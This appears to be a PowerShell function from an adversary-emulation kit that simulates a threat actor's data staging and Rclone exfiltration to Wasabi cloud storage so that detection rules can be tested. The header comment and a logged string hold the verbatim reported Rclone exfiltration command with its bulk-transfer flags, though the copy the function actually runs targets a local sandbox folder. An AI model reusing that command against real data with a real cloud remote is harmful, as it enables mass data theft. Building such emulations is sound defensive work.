# ============================================================================
# GENTLEMAN SIMULATION - PHASE 9: COLLECTION & EXFILTRATION
# ============================================================================
# Simulates: staging of sensitive data followed by Rclone exfiltration of
# large volumes of data to Wasabi cloud storage, using the exact reported
# command-line flags, before additional TukTuk implants were pushed to
# critical infrastructure.
# MITRE: T1560 Archive Collected Data, T1567.002 Exfiltration to Cloud
#        Storage
#
# Report artifact reproduced (paths genericized to REDACTED in the source):
#   rclone.exe copy "Z:\REDACTED\REDACTEDs" wasabi:"/REDACTED/REDACTED"
#     --max-age 2y --exclude "AppData/**" --copy-links --transfers=16
#     --checkers=128 --fast-list --progress --ignore-existing
#     --cache-workers=32 --multi-thread-streams=32
#     --multi-thread-chunk-size=512M --multi-thread-cutoff=128M
#     --max-backlog=20000 --stats=5s --use-mmap --tpslimit=0 --bwlimit=off
#
# SAFETY: exfiltration source/destination are both confined to this sim's
# own Staging/Exfil folders - never real user data, never a real Wasabi
# bucket credential.
# ============================================================================

function Simulate-Exfiltration {
    param($SimPaths)

    Write-Host "[+] Phase 9: Collection & Exfiltration - Rclone to Wasabi ..." -ForegroundColor Green

    # --- Collection: stage synthetic "sensitive" files to be exfiltrated ---
    $collectionDir = "$($SimPaths.Staging)\collected_data"
    New-Item -Path $collectionDir -ItemType Directory -Force | Out-Null
    1..10 | ForEach-Object {
        Set-Content -Path "$collectionDir\finance_record_$_.csv" -Value "SIMULATION,synthetic,record,$_,$(Get-Date -Format o)" -Force
    }
    Write-SimEvent -EventId 9001 -Message "SIMULATION: sensitive data staged for exfiltration at $collectionDir (T1560 Archive Collected Data)"

    # --- Download real Rclone release from its legitimate official source ---
    $rcloneDir = "$($SimPaths.Tools)\rclone-v1.73.5-windows-amd64"
    $rcloneZip = "$($SimPaths.Tools)\rclone.zip"
    $rcloneExe = "$rcloneDir\rclone-v1.73.5-windows-amd64\rclone.exe"
    try {
        Invoke-WebRequest -Uri "https://downloads.rclone.org/v1.73.5/rclone-v1.73.5-windows-amd64.zip" -OutFile $rcloneZip -TimeoutSec 15 -ErrorAction Stop
        Expand-Archive -Path $rcloneZip -DestinationPath $rcloneDir -Force -ErrorAction Stop
        $found = Get-ChildItem -Path $rcloneDir -Filter "rclone.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) { $rcloneExe = $found.FullName } else { throw "rclone.exe not found in archive" }
        Write-SimEvent -EventId 9002 -Message "SIMULATION: real Rclone v1.73.5 downloaded from official downloads.rclone.org (matches reported version)"
    } catch {
        Write-Warning "Rclone download failed/offline, falling back to decoy binary: $_"
        New-Item -Path (Split-Path $rcloneExe -Parent) -ItemType Directory -Force | Out-Null
        New-DecoyBinary -Path $rcloneExe -SizeBytes 41943040 | Out-Null
    }

    # --- Log the exact reported command line for detection-rule testing ---
    $realRcloneCmd = 'rclone.exe  copy "Z:\REDACTED\REDACTEDs" wasabi:"/REDACTED/REDACTED" --max-age 2y --exclude "AppData/**" --copy-links --transfers=16 --checkers=128 --fast-list --progress --ignore-existing --cache-workers=32 --multi-thread-streams=32 --multi-thread-chunk-size=512M --multi-thread-cutoff=128M --max-backlog=20000 --stats=5s --use-mmap --tpslimit=0 --bwlimit=off'
    Set-Content -Path "$($SimPaths.Logs)\phase9_rclone_command.log" -Value $realRcloneCmd -Force
    Write-Host "    Reported command: $realRcloneCmd" -ForegroundColor DarkGray

    # --- Configure Rclone with a local "wasabi" remote pointed at our own
    #     Exfil sandbox folder (a real local rclone copy operation, but the
    #     destination is never the real Wasabi cloud service) ---
    $rcloneConfigDir = "$($SimPaths.Staging)\rclone_config"
    New-Item -Path $rcloneConfigDir -ItemType Directory -Force | Out-Null
    $rcloneConfigFile = "$rcloneConfigDir\rclone.conf"
    Set-Content -Path $rcloneConfigFile -Value @"
[wasabi]
type = local
"@ -Force

    try {
        # Real rclone.exe binary, real copy operation, but remote "wasabi" is
        # locally defined as type=local pointed at our own Exfil sandbox -
        # never the actual Wasabi cloud service or a real credential.
        $rcloneArgs = "--config `"$rcloneConfigFile`" copy `"$collectionDir`" `"wasabi:$($SimPaths.Exfil)`" --max-age 2y --exclude `"AppData/**`" --copy-links --transfers=16 --checkers=128 --fast-list --progress --ignore-existing --stats=5s --tpslimit=0 --bwlimit=off"
        Start-Process -FilePath $rcloneExe -ArgumentList $rcloneArgs -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
        Write-SimEvent -EventId 9003 -Message "SIMULATION: rclone.exe executed with reported flag set, copying staged data to sandboxed 'wasabi' remote at $($SimPaths.Exfil) (T1567.002)"
    } catch { Write-Warning "Rclone exfiltration simulation failed: $_" }

    # --- Generate DNS telemetry against the real Wasabi domain (no data sent) ---
    Invoke-SafeNetworkAttempt -Target $Global:GentlemanIOCs.WasabiExfilDomain -Port 443
    Write-SimEvent -EventId 9004 -Message "SIMULATION: outbound connection attempt to real Wasabi cloud storage domain ($($Global:GentlemanIOCs.WasabiExfilDomain)) for telemetry authenticity"

    Write-Host "  [OK] Exfiltration artifacts created - staged copy under $($SimPaths.Exfil)" -ForegroundColor Yellow

    return @{
        RcloneExe     = $rcloneExe
        CollectionDir = $collectionDir
    }
}
